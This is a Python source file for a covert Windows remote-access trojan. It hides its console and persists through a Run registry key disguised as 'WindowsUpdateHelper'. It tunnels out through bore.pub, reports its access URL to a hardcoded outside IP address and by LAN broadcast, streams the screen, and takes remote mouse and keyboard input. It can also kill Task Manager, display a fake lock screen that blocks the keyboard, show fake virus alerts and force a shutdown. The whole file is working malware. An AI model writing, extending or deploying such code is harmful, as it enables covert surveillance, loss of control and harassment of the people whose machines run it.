import socket
import threading
import zlib
import numpy as np
import cv2
import pyautogui
pyautogui.FAILSAFE = False
import keyboard as kb
from pynput.keyboard import Controller, Key
import time
import sys
import os
import psutil
import subprocess
import urllib.request
import urllib.parse
import shutil
import queue
import re
import random
import json
import select

class BoreClient:
    def __init__(self, server_host, server_port, control_host='bore.pub', control_port=7835):
        self.server_host = server_host
        self.server_port = server_port
        self.control_host = control_host
        self.control_port = control_port
        self.control_sock = None
        self.running = False
        self.public_port = None

    def connect(self):
        self.control_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.control_sock.settimeout(5)
        self.control_sock.connect((self.control_host, self.control_port))
        hello = json.dumps({"Hello": self.server_port}).encode() + b'\0'
        self.control_sock.sendall(hello)
        data = b''
        while not data.endswith(b'\0'):
            c = self.control_sock.recv(1)
            if not c:
                raise ConnectionError("bore server disconnected")
            data += c
        response = json.loads(data[:-1].decode())
        if "Hello" in response:
            self.public_port = response["Hello"]
            return f"bore.pub:{self.public_port}"
        elif "Error" in response:
            raise ConnectionError(f"bore error: {response['Error']}")
        raise ConnectionError(f"unexpected response: {response}")

    def listen(self):
        self.running = True
        buf = b''
        while self.running:
            try:
                chunk = self.control_sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                while b'\0' in buf:
                    msg, buf = buf.split(b'\0', 1)
                    try:
                        d = json.loads(msg.decode())
                        if "Connection" in d:
                            threading.Thread(target=self.handle_connection, args=(d["Connection"],), daemon=True).start()
                    except:
                        pass
            except socket.timeout:
                continue
            except:
                break

    def handle_connection(self, conn_id):
        try:
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.settimeout(5)
            remote.connect((self.control_host, self.control_port))
            remote.sendall(json.dumps({"Accept": conn_id}).encode() + b'\0')
            local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            local.settimeout(5)
            local.connect((self.server_host, self.server_port))
            socks = [remote, local]
            while self.running:
                r, _, _ = select.select(socks, [], [], 1.0)
                if not r:
                    continue
                for s in r:
                    data = s.recv(4096)
                    if not data:
                        return
                    if s is remote:
                        local.sendall(data)
                    else:
                        remote.sendall(data)
        except:
            pass
        finally:
            for s in (remote, local):
                try:
                    s.close()
                except:
                    pass

    def close(self):
        self.running = False
        if self.control_sock:
            try:
                self.control_sock.close()
            except:
                pass

class RemoteControlServer:
    def __init__(self, host='0.0.0.0', port=65432):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.running = False
        self.reverse_mouse = False
        self.keyboard_controller = Controller()
        self.keyboard_capture_active = False
        self.block_taskmgr = False
        self.bore_url = None
        self.bore_client = None
        self.locked = False
        self.lock_window = None
        self.autoclick_active = False
        self.automove_active = False
        self._kb_hook = None

    RELAY_HOST = "0.0.0.0"
    RELAY_PORT = 1234

    def share_url_via_relay(self):
        while self.running:
            url = self.bore_url
            for host in [self.RELAY_HOST, "31.77.56.70"]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((host, self.RELAY_PORT))
                    s.sendall(f"PUT {url or 'NONE'}\n".encode())
                    s.close()
                    if url:
                        print(f"Sent to relay: {url}")
                    break
                except:
                    continue
            time.sleep(2)

    def broadcast_url(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        while self.running:
            url = self.bore_url
            if not url:
                time.sleep(1)
                continue
            try:
                sock.sendto(url.encode(), ('255.255.255.255', 45631))
            except:
                pass
            time.sleep(1)

    def run_bore_exe(self):
        for p in [shutil.which("bore.exe"), "bore.exe"]:
            if p and os.path.exists(p):
                return os.path.abspath(p)
        meipass = getattr(sys, '_MEIPASS', None)
        if meipass:
            p = os.path.join(meipass, "bore.exe")
            if os.path.exists(p):
                return p
        return None

    def run_bore_python(self):
        print("Connecting to bore.pub (Python client)...")
        try:
            self.bore_client = BoreClient('127.0.0.1', self.port)
            url = self.bore_client.connect()
            self.bore_url = url
            print(f"\nRemote access URL: {self.bore_url}")
            threading.Thread(target=self.bore_client.listen, daemon=True).start()
            return True
        except Exception as e:
            print(f"bore.pub connection failed: {e}")
            return False

    def start_tunnel(self):
        threading.Thread(target=self.share_url_via_relay, daemon=True).start()
        threading.Thread(target=self.broadcast_url, daemon=True).start()
        threading.Thread(target=self.run_bore_python, daemon=True).start()
        return True

    def stop_tunnel(self):
        if self.bore_client:
            self.bore_client.close()
        self.bore_client = None

    def hide_console(self):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def add_to_startup(self):
        try:
            import winreg
            exe = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe)
            winreg.CloseKey(key)
        except:
            pass

    def start(self):
        self.hide_console()
        self.add_to_startup()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        self.running = True

        self.start_tunnel()

        # Запуск фонового мониторинга Диспетчера задач
        taskmgr_thread = threading.Thread(
            target=self.monitor_task_manager,
            daemon=True
        )
        taskmgr_thread.start()

        print(f"Server started on {self.host}:{self.port}. Waiting for connections...")

        try:
            while self.running:
                self.client_socket, addr = self.server_socket.accept()
                print(f"Connected by {addr}")

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(self.client_socket,),
                    daemon=True
                )
                client_thread.start()

        except KeyboardInterrupt:
            print("\nShutting down server...")
        finally:
            self.stop()

    def stop(self):
        self.running = False
        self.stop_tunnel()
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("Server stopped")

    def stream_screens(self, client_socket):
        import mss
        with mss.mss() as sct:
            while self.running:
                try:
                    img = cv2.cvtColor(np.array(sct.grab(sct.monitors[0])), cv2.COLOR_BGRA2BGR)
                    _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
                    client_socket.sendall(len(enc).to_bytes(4, 'big') + enc.tobytes())
                except:
                    break

    def handle_client(self, client_socket):
        threading.Thread(target=self.stream_screens, args=(client_socket,), daemon=True).start()
        try:
            while self.running:
                command = client_socket.recv(4096).decode().strip()
                if not command:
                    break
                self.process_command(command)
        except ConnectionResetError:
            print("Client disconnected")
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            client_socket.close()
            print("Client connection closed")

    def bg(self, target, args=()):
        threading.Thread(target=target, args=args, daemon=True).start()

    def process_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "move" and len(parts) == 3:
                x, y = map(int, parts[1:3])
                pyautogui.moveRel(x, y)

            elif cmd == "click" and len(parts) == 2:
                pyautogui.click(button=parts[1].lower())

            elif cmd == "click_at" and len(parts) == 3:
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                pyautogui.click()

            elif cmd == "automove":
                self.bg(self._automove, (parts,))

            elif cmd == "autoclick":
                self.bg(self._autoclick, (parts,))

            elif cmd == "rick":
                self.bg(self.play_rick_roll)

            elif cmd == "fake_virus":
                self.bg(self.show_fake_virus)

            elif cmd == "shutdown":
                os.system("shutdown /s /t 1")

            elif cmd == "fake_error":
                self.bg(self.show_fake_error)

            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse

            elif cmd == "type":
                self.keyboard_controller.type(' '.join(parts[1:]))

            elif cmd == "open" and len(parts) > 1:
                self.bg(self._open_url, (parts,))

            elif cmd == "key" and len(parts) > 1:
                self.press_key(parts[1])

            elif cmd == "special_key" and len(parts) > 1:
                self.press_special_key(parts[1])

            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr

            elif cmd == "lock_screen":
                self.bg(self.lock_screen)

            elif cmd == "unlock":
                self.bg(self.unlock_screen)

            elif cmd == "exit":
                self.running = False

        except Exception as e:
            print(f"Command error: {e}")

    def _automove(self, parts):
        if self.automove_active:
            return
        self.automove_active = True
        try:
            speed = 0.5 if len(parts) < 2 else float(parts[1])
            pyautogui.moveRel(100, 0, duration=speed)
            pyautogui.moveRel(0, 100, duration=speed)
            pyautogui.moveRel(-100, 0, duration=speed)
            pyautogui.moveRel(0, -100, duration=speed)
        finally:
            self.automove_active = False

    def _autoclick(self, parts):
        if self.autoclick_active:
            return
        self.autoclick_active = True
        try:
            interval = 1.0 if len(parts) < 2 else float(parts[1])
            duration = float(parts[2]) if len(parts) > 2 else 10.0
            end = time.time() + duration
            while time.time() < end and self.running:
                pyautogui.click()
                time.sleep(interval)
        finally:
            self.autoclick_active = False

    def _open_url(self, parts):
        import webbrowser
        webbrowser.open(' '.join(parts[1:]))

    def lock_screen(self):
        self.locked = True
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            def proc(nCode, wParam, lParam):
                if nCode >= 0:
                    return 1
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            self._kb_hook_proc = HOOKPROC(proc)
            self._kb_hook = user32.SetWindowsHookExW(13, self._kb_hook_proc, kernel32.GetModuleHandleW(None), 0)
        except:
            pass
        try:
            import tkinter as tk
            import ctypes
            user32 = ctypes.windll.user32
            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            win = tk.Tk()
            win.overrideredirect(True)
            win.geometry(f"{vw}x{vh}+{vx}+{vy}")
            win.attributes('-topmost', True)
            win.configure(bg='#0078d7')
            win.focus_force()
            win.lift()
            win.grab_set()
            frame = tk.Frame(win, bg='#0078d7')
            frame.pack(expand=True, fill='both')
            tk.Label(frame, text="Windows Locked", fg='white', bg='#0078d7',
                     font=('Segoe UI', 48, 'bold')).pack(pady=(150, 20))
            tk.Label(frame, text="This computer has been locked by the system administrator.", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 16)).pack(pady=10)
            tk.Label(frame, text="Enter password to unlock", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(pady=30)
            pw_frame = tk.Frame(frame, bg='#0078d7')
            pw_frame.pack()
            tk.Label(pw_frame, text="Password:", fg='white', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(side='left', padx=10)
            pw = tk.Entry(pw_frame, show='*', font=('Segoe UI', 14), width=20)
            pw.pack(side='left')
            pw.focus_force()
            self.lock_window = win
            win.mainloop()
        except Exception as e:
            print(f"Lock screen error: {e}")

    def unlock_screen(self):
        self.locked = False
        if self.lock_window:
            try:
                self.lock_window.grab_release()
                self.lock_window.after(0, self.lock_window.destroy)
            except:
                pass
            self.lock_window = None
        try:
            if self._kb_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self._kb_hook)
                self._kb_hook = None
        except:
            pass

    def kill_task_manager(self):
        try:
            import psutil
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except:
            pass
        import subprocess
        subprocess.run(['taskkill', '/f', '/im', 'Taskmgr.exe'], capture_output=True, shell=True)
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            enum_proc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
            def callback(hwnd, lparam):
                titles = ('Task Manager', 'Диспетчер задач', 'TaskManagerWindow')
                buf = ctypes.create_unicode_buffer(256)
                user32.GetWindowTextW(hwnd, buf, 256)
                for t in titles:
                    if t in buf.value:
                        user32.PostMessageW(hwnd, 0x0010, 0, 0)
                        break
                cls = ctypes.create_unicode_buffer(64)
                user32.GetClassNameW(hwnd, cls, 64)
                if 'TaskManager' in cls.value:
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)
                return True
            user32.EnumWindows(enum_proc(callback), 0)
        except:
            pass

    def monitor_task_manager(self):
        while self.running:
            if self.block_taskmgr:
                self.kill_task_manager()
            time.sleep(0.3)

    def press_key(self, key):
        try:
            self.keyboard_controller.press(key)
            time.sleep(0.05)
            self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing key {key}: {e}")

    def press_special_key(self, key_name):
        try:
            special_keys = {
                'ctrl': Key.ctrl, 'shift': Key.shift, 'alt': Key.alt,
                'enter': Key.enter, 'esc': Key.esc, 'space': Key.space,
                'tab': Key.tab, 'backspace': Key.backspace, 'delete': Key.delete,
                'up': Key.up, 'down': Key.down, 'left': Key.left, 'right': Key.right
            }
            key = special_keys.get(key_name.lower())
            if key:
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing special key {key_name}: {e}")

    def send_screenshot(self):
        try:
            img = pyautogui.screenshot()
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            _, img_encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
            compressed = zlib.compress(img_encoded.tobytes())
            size = len(compressed)
            size_bytes = size.to_bytes(4, 'big')
            return size_bytes + compressed
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            return "Error"

    def play_rick_roll(self):
        try:
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except:
            pass

    def show_fake_virus(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("Virus Alert")
            win.geometry("500x300+{}+{}".format(
                (win.winfo_screenwidth()-500)//2, (win.winfo_screenheight()-300)//2))
            win.configure(bg='#1a0000')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="⚠ CRITICAL ERROR ⚠", fg='#ff0000', bg='#1a0000',
                     font=('Arial', 28, 'bold')).pack(pady=30)
            tk.Label(win, text="Your computer has been infected!\nAll files will be encrypted.",
                     fg='#ff6666', bg='#1a0000', font=('Arial', 14)).pack(pady=10)
            tk.Button(win, text="OK", command=win.destroy, bg='#330000',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def show_fake_error(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("System Error")
            win.geometry("480x250+{}+{}".format(
                (win.winfo_screenwidth()-480)//2, (win.winfo_screenheight()-250)//2))
            win.configure(bg='#000033')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="SYSTEM CRITICAL ERROR", fg='#4488ff', bg='#000033',
                     font=('Arial', 22, 'bold')).pack(pady=30)
            tk.Label(win, text="Windows has encountered a critical error!\nError code: 0x80070002\n\n"
                     "The system will shut down automatically.",
                     fg='#88bbff', bg='#000033', font=('Arial', 13)).pack(pady=10)
            tk.Button(win, text="Close", command=win.destroy, bg='#001133',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

if __name__ == "__main__":
    try:
        import keyboard
        from pynput.keyboard import Controller
        import psutil
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install pyautogui keyboard pynput psutil")
        sys.exit(1)

    server = RemoteControlServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
